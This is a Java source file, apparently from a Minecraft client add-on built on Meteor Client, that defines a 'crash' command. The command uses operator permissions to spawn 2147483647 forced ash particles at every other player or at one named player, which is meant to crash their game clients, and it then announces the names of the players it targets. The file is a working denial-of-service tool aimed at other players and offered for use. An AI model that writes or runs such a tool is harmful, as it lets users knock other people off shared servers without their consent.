package pwn.noobs.trouserstreak.commands;

import com.mojang.authlib.GameProfile;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import meteordevelopment.meteorclient.commands.Command;
import meteordevelopment.meteorclient.commands.arguments.PlayerListEntryArgumentType;
import meteordevelopment.meteorclient.utils.player.ChatUtils;
import net.minecraft.client.network.PlayerListEntry;
import net.minecraft.command.CommandSource;
import net.minecraft.text.Text;

import java.util.concurrent.CopyOnWriteArrayList;

import static com.mojang.brigadier.Command.SINGLE_SUCCESS;
import static meteordevelopment.meteorclient.MeteorClient.mc;

public class CrashCommand extends Command {
    public CrashCommand() {
        super("crash", "Crash players, requires permission level 2 or higher");
    }
    private CopyOnWriteArrayList<PlayerListEntry> players;

    @Override
    public void build(LiteralArgumentBuilder<CommandSource> builder) {
        builder.executes(ctx -> {
            players = new CopyOnWriteArrayList<>(mc.getNetworkHandler().getPlayerList());
            if (players.size() <= 1) {  // Check if there is only one player (you) on the server
                error("No other players found on the server");
                return SINGLE_SUCCESS;
            }
            if(mc.player.hasPermissionLevel(2)) {
                ChatUtils.sendPlayerMsg("/execute at @a[name=!" + mc.player.getName().getString() + "] run particle ash ~ ~ ~ 1 1 1 1 2147483647 force @a[name=!" + mc.player.getName().getString() + "]");
                StringBuilder playerNames = new StringBuilder("Crashing players: ");
                for (PlayerListEntry player : players) {
                    if (!player.getProfile().getId().equals(mc.player.getGameProfile().getId())) {
                        playerNames.append(player.getProfile().getName()).append(", ");
                    }
                }
                playerNames.setLength(playerNames.length() - 2);  // Remove the extra comma and space at the end
                ChatUtils.sendMsg(Text.of(playerNames.toString()));
                return SINGLE_SUCCESS;
            } else if (!(mc.player.hasPermissionLevel(2))) error("Must have permission level 2 or higher");
            return SINGLE_SUCCESS;
        });
        builder.then(argument("player", PlayerListEntryArgumentType.create()).executes(context -> {
            GameProfile profile = PlayerListEntryArgumentType.get(context).getProfile();
            if (profile != null) {
                if (mc.getNetworkHandler().getPlayerList().stream().anyMatch(player -> player.getProfile().getId().equals(profile.getId()))) {
                    if (mc.player.hasPermissionLevel(2)) {
                        ChatUtils.sendPlayerMsg("/execute at " + profile.getName() + " run particle ash ~ ~ ~ 1 1 1 1 2147483647 force " + profile.getName());
                        ChatUtils.sendMsg(Text.of("Crashing player: " + profile.getName()));
                    } else if (!mc.player.hasPermissionLevel(2)) error("Must have permission level 2 or higher");
                } else {
                    error("Player not found in the current server");
                }
            } else {
                error("Player profile not found");
            }
            return SINGLE_SUCCESS;
        }));
    }
}